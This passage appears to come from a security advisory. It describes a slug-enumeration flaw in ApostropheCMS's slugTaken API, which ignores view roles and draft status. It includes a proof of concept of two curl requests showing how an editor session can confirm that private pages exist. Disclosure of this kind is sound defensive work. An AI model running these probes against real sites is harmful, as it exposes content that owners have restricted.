- Filter by `viewRole`.
- Filter by publication status (draft vs published).

A single authenticated session can iterate the slug space to enumerate the full content
inventory of the CMS, including content the user is explicitly prohibited from viewing.

### PoC
```bash
# Any authenticated session works — editor role sufficient
curl -b "$EDITOR_JAR" -X POST \
  -H "Content-Type: application/json" \
  -d '{"slug":"known-private-page-slug"}' \
  "http://TARGET/api/v1/@apostrophecms/doc/slugTaken"
# → { "taken": true }  — confirms private page exists

curl -b "$EDITOR_JAR" -X POST \
  -H "Content-Type: application/json" \
  -d '{"slug":"zzz-nonexistent"}' \
  "http://TARGET/api/v1/@apostrophecms/doc/slugTaken"
# → { "taken": false }
```

### Impact
Information disclosure. An attacker with any authenticated session can enumerate all
slugs in the system, mapping the full content structure of the CMS including private and
admin-only content.
